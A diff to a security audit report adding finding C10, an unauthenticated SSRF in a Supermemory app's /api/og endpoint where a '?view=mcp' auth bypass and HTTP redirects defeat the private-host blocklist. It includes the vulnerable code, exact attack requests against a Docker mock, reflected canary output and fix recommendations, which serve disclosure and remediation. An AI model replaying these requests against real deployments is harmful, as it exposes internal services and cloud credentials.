@@ -42,6 +42,7 @@ The round-6 dependency-confusion candidate (C6 — `apps/mcp` package name `supe
 
 <!-- C7 and C8 were CONFIRMED LIVE in round 10 by independent raw re-probe (code-reviewer). MEDIUM counts above bumped 2→4. -->
 <!-- C9 (round 11) was CONFIRMED LIVE by independent raw re-probe but is a DEEPENING of C7 on the SAME /api/og sink (non-blind reflection + 169.254 blocklist gap), NOT a 5th independent finding. MEDIUM count stays 4. -->
+<!-- C10 (round 14) was CONFIRMED LIVE by independent raw re-probe but is a further DEEPENING of the C7/C9 /api/og family (redirect defeats isPrivateHost wholesale → loopback/RFC1918 reachable + content reflected), NOT a 5th independent finding. MEDIUM count stays 4. -->
 
 ## Exploit Chains
 
@@ -176,7 +177,7 @@ Proof file: `autofyn_audit/.audit_state/exploit_08.proof`
 
 | Field | Value |
 |-------|-------|
-| **Severity** | MEDIUM — **[live result pending]** |
+| **Severity** | MEDIUM — **CONFIRMED LIVE** (round 11; deepens the C7 `/api/og` family) |
 | **Affected files** | `apps/web/middleware.ts:30-32` (bypass), `apps/web/app/api/og/route.ts:16-36` (`isPrivateHost` — RFC1918/loopback only, no `169.254.0.0/16`), `:159-164` (private-host 400), `:182` (fetch), `:199-236` (OG/meta scrape reflected into JSON body) |
 | **Authentication** | **None required** (no cookie, no session — `?view=mcp` keystone) |
 | **Relationship to C7** | Distinct primitives on the SAME sink: C7 proved a BLIND unauth callback. C9 proves the SSRF is (A) NON-BLIND — scraped content is reflected to the caller, and (B) reaches the cloud-metadata IP `169.254.169.254` (blocklist gap). C9 deepens/strengthens C7. |
@@ -226,6 +227,121 @@ not an actual credential dump. Not lower — both primitives are material on Nod
 ```
 
 Proof file: `autofyn_audit/.audit_state/exploit_09.proof`
+
+---
+
+### C10 — Unauthenticated SSRF: Redirect Defeats `isPrivateHost` Blocklist (Loopback/RFC1918 Reachable via `?view=mcp`)
+
+<!-- C10 CONFIRMED LIVE (round 14). Counted as a further deepening of the C7/C9 /api/og
+     family (same sink, independent technique), consistent with how C9 was handled — the
+     headline MEDIUM count therefore stays 4, not 5. -->
+
+| Field | Value |
+|-------|-------|
+| **Severity** | MEDIUM — **CONFIRMED LIVE** (deepens the C7/C9 `/api/og` family; not a separate 5th MEDIUM) |
+| **Affected files** | `apps/web/middleware.ts:30` (`?view=mcp` early-return before `/api/*` 401 gate), `apps/web/app/api/og/route.ts:159` (blocklist checked on initial URL only — no per-redirect re-check), `:182` (`fetch` with no `redirect` option → Node/undici default `redirect:"follow"`), `:199-236` (OG/meta scrape reflected into JSON body) |
+| **Authentication** | **None required** (no cookie, no session — `?view=mcp` keystone, same as C7/C9) |
+| **Relationship to C7/C9** | Independent, strictly stronger technique on the SAME `/api/og` sink. C7 = unauth reachability of the sink via `?view=mcp`. C9 = a range-gap *in* the blocklist (`169.254/16` not listed). C10 = the blocklist is bypassed *entirely* via HTTP redirect, reaching loopback and RFC1918 that the blocklist explicitly enumerates — different root cause from C9 (missing per-redirect re-check / no `redirect:"manual"`, vs C9's incomplete IP list). |
+
+#### Root Cause
+
+`isPrivateHost(urlObj.hostname)` at `route.ts:159` checks only the **parsed hostname string of the initial URL**. It is a string/prefix match with no DNS resolution. `fetch(trimmedUrl, {...})` at `:182` sets no `redirect` key, so Node/undici defaults to `redirect:"follow"` and fetches the 30x destination **without re-calling `isPrivateHost`**. The scraped `<title>` / `og:title` / `og:description` are reflected back in the JSON body (`:199-236`).
+
+Real code (audited commit `268499068810586495ba5bd4773f8c5786d9fc97`):
+
+```typescript
+// route.ts:158-164
+const urlObj = new URL(trimmedUrl)
+if (isPrivateHost(urlObj.hostname)) {          // line 159 — checked ONCE on the initial URL
+    return Response.json(
+        { error: "Private/localhost URLs are not allowed" },
+        { status: 400 },
+    )
+}
+
+// route.ts:182-188 — fetch with NO redirect option → redirect:"follow" (default)
+const response = await fetch(trimmedUrl, {
+    signal: controller.signal,
+    headers: {
+        "User-Agent":
+            "Mozilla/5.0 (compatible; SuperMemory/1.0; +https://supermemory.ai)",
+    },
+})
+```
+
+`middleware.ts:30`:
+```typescript
+// MCP setup page is public — no auth required
+if (url.searchParams.get("view") === "mcp") {
+    return NextResponse.next()   // fires BEFORE the /api/* 401 gate at :34
+}
+```
+
+#### Two Independently Load-Bearing Proofs
+
+**Proof A — control is active / target blocked directly.**
+UNAUTH `GET /api/og?url=http://<blocked-mock-IP>:<port>/internal-secret&view=mcp` (no cookie).
+`isPrivateHost()` sees the literal blocked IP → PASS = HTTP 400 with `"Private/localhost URLs are not allowed"`. Confirms the control is working AND that this specific address is directly forbidden.
+
+**Proof B — bypass: same address reached via attacker redirect.**
+UNAUTH `GET /api/og?url=http://audit-mock:<port>/redirect-to-internal&view=mcp` (no cookie).
+`audit-mock` is a Docker container DNS name — not an IP, so `isPrivateHost("audit-mock")` returns `false`. The mock server returns `302 Location: http://<blocked-mock-IP>:<port>/internal-secret`. `fetch()` follows the redirect WITHOUT re-running `isPrivateHost`. The web server fetches `/internal-secret` and reflects its `<title>` / `og:description` (which embed a unique `INTERNAL-SECRET-<uuid>` canary) back in the JSON body. PASS = HTTP 200 AND `INTERNAL-SECRET-<uuid>` canary present in response body.
+
+The delta between A (blocked) and B (reached with canary) isolates the redirect as the cause. The `INTERNAL-SECRET` canary is **distinct** from the `SSRF-CANARY` used by C1/C7/C9 — its presence unambiguously proves the internal page was read, not the public redirect hop.
+
+#### Impact
+
+On a Node/self-host deployment (this harness; Supermemory enterprise self-host bundle), an unauth attacker submits any public redirector URL pointing to an internal service. The `isPrivateHost` blocklist — which explicitly covers `127.x`, `10.x`, `172.16-31.x`, `192.168.x`, `0.0.0.0`, `localhost`, `::1` — is completely defeated. The fetched internal page's content is reflected back to the unauthenticated attacker. On a cloud VM this reaches the IMDS (`127.x`/`169.254.169.254`) and reflects credentials. No authentication required.
+
+This is materially worse than C9 (which only reaches the narrow `169.254/16` gap) and reaches precisely the addresses `isPrivateHost` was written to stop.
+
+#### Honesty / Production Mitigation
+
+`apps/web/wrangler.jsonc` sets `global_fetch_strictly_public` (Cloudflare Workers compatibility flag), which blocks egress to private IPs at the platform layer **and applies to redirect targets as well** — so on the flagship Cloudflare-hosted deployment the real-world impact of C10 is mitigated at the runtime, exactly as with C1/C7/C9. The full-impact case is self-hosted / non-Cloudflare (Node.js) deployments. This harness proves the app-layer control is **fully defeated** (loopback/RFC1918 reachable via redirect, content reflected, zero auth); it does not exfiltrate real cloud credentials (no real IMDS in-harness). C10 is a strictly stronger, independent technique vs C9.
+
+#### Evidence
+
+Confirmed live (code-reviewer independent raw re-probe over `autofyn-audit-net`).
+Mock self-discovered IP this run = `172.22.0.2` (in the `172.16-31.x` range → `isPrivateHost`
+blocks it directly; the blocked-range assert guard was satisfied, so Proof A's 400 is meaningful).
+Canary this run = `INTERNAL-SECRET-fcb7a00f-61b9-463f-b5cd-f5a9139b1b7b` (the IP and canary
+UUID regenerate every run — they are not load-bearing constants).
+
+```
+PROOF A — Baseline (blocklist is active, address directly blocked):
+  UNAUTH GET /api/og?url=http://172.22.0.2:9099/internal-secret&view=mcp  (no cookie)
+    → HTTP 400
+  Body: {"error":"Private/localhost URLs are not allowed"}
+
+PROOF B — Bypass (same address via attacker redirect):
+  UNAUTH GET /api/og?url=http://audit-mock:9099/redirect-to-internal&view=mcp  (no cookie)
+    → HTTP 200
+  Body: {"title":"INTERNAL-SECRET-fcb7a00f-61b9-463f-b5cd-f5a9139b1b7b-og-title",
+         "description":"INTERNAL-SECRET-fcb7a00f-61b9-463f-b5cd-f5a9139b1b7b-og-desc"}
+  INTERNAL-SECRET canary in response body: PRESENT
+  (the canary lives ONLY on /internal-secret at the blocked IP; the /redirect-to-internal
+   body is inert "redirecting to internal target" — so the web server MUST have followed the
+   302 to the blocked IP and read the internal page to produce this reflection)
+
+  Same request WITHOUT &view=mcp:
+    → HTTP 401  {"error":"Unauthorized"}  (confirms the ?view=mcp bypass is load-bearing)
+
+Redirect hop verified directly:
+  GET http://audit-mock:9099/redirect-to-internal
+    → HTTP/1.0 302 Found, Location: http://172.22.0.2:9099/internal-secret,
+      body = "redirecting to internal target" (canary ABSENT from redirect body)
+
+Overall: CONFIRMED LIVE — isPrivateHost blocklist fully bypassed via HTTP redirect,
+unauthenticated, with internal-page content reflected back to the caller.
+```
+
+Proof file: `autofyn_audit/.audit_state/exploit_10.proof`
+
+#### Recommendation
+
+1. Set `redirect: "manual"` in the `fetch()` call at `route.ts:182` so redirects are never automatically followed.
+2. If redirect-following is needed, re-validate every `Location` header through `isPrivateHost` before following — apply the blocklist to each hop, not only the initial URL.
+3. Alternatively, add a server-side HTTP proxy with an explicit allowlist for external-only URLs and no redirect-following.
 
 ---
 
